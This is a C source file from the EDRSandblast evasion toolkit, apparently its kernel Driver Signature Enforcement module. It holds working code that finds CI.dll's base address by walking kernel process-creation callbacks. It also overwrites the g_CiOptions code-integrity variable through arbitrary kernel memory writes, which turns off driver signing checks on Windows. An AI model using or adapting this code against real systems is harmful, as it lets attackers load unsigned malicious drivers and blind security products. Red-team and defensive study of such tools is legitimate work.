#include "windows.h"
#include "KernelDSE.h"
#include "../EDRSandblast.h"
#include "winternl.h"
#include "stdio.h" // for printf
//#include "ntstatus.h"
#include "KernelCallbacks.h"
#include "NtoskrnlOffsets.h"
#include "KernelMemoryPrimitives.h"
#include "KernelUtils.h"
#include "tchar.h"

#define nullptr ((void*)0)

 BOOLEAN IsCiEnabled()
{
	SYSTEM_CODEINTEGRITY_INFORMATION CiInfo = { sizeof(SYSTEM_CODEINTEGRITY_INFORMATION) };
	const NTSTATUS Status = NtQuerySystemInformation(SystemCodeIntegrityInformation,
		&CiInfo,
		sizeof(CiInfo),
		nullptr);
	if (!NT_SUCCESS(Status))
		printf("[-] Failed to query code integrity status: %08X\n", Status);

	return (CiInfo.CodeIntegrityOptions &
		(CODEINTEGRITY_OPTION_ENABLED | CODEINTEGRITY_OPTION_TESTSIGN)) == CODEINTEGRITY_OPTION_ENABLED;
}

 DWORD64  FindCIBaseAddress(BOOL verbose) {
     DWORD64 NotifyRoutineAddress = GetNotifyRoutineAddress(CREATE_PROCESS_ROUTINE);
     SIZE_T CurrentEDRCallbacksCount = 0;
     DWORD64 CiBaseAddress = 0;
     DWORD64 driverOffset = 0;
     DWORD64 callback = 0;
     DWORD64 cbFunction = 0;
     TCHAR* driver = NULL;
     DWORD64 callback_struct = 0;
     for (int i = 0; i < PSP_MAX_CALLBACKS; ++i) {
         DWORD64 callback_struct = ReadMemoryDWORD64(NotifyRoutineAddress + (i * sizeof(DWORD64)));
         if (callback_struct != 0) {
             callback = (callback_struct & ~0b1111) + 8; //TODO : replace this hardcoded offset ?
             cbFunction = ReadMemoryDWORD64(callback);
             driver = FindDriverName(cbFunction, &driverOffset);
             if (_tcscmp(driver, L"CI.dll") == 0) {
                 CiBaseAddress = cbFunction - driverOffset;
                 if (verbose)
                     printf("[+] %s FOUND at %016llx - 0x%llx : 0x%llx\n", driver, cbFunction, driverOffset, CiBaseAddress);
                 return CiBaseAddress;
             }
         }
     }
     return CiBaseAddress;
 }

 BOOL patch_gCiOptions(PVOID CiVariableAddress, ULONG CiOptionsValue, PULONG OldCiOptionsValue) {
     *OldCiOptionsValue = ReadMemoryDWORD64(CiVariableAddress);
     //printf("[+KERNELDSE] The value of gCI at 0x%llx is 0x%x.\n", CiVariableAddress, *OldCiOptionsValue);
     WriteMemoryDWORD64(CiVariableAddress, CiOptionsValue);
     //printf("[+KERNELDSE] New value of gCI at 0x%llx is 0x%x.\n", CiVariableAddress, ReadMemoryDWORD64(CiVariableAddress));
     return TRUE;
 }
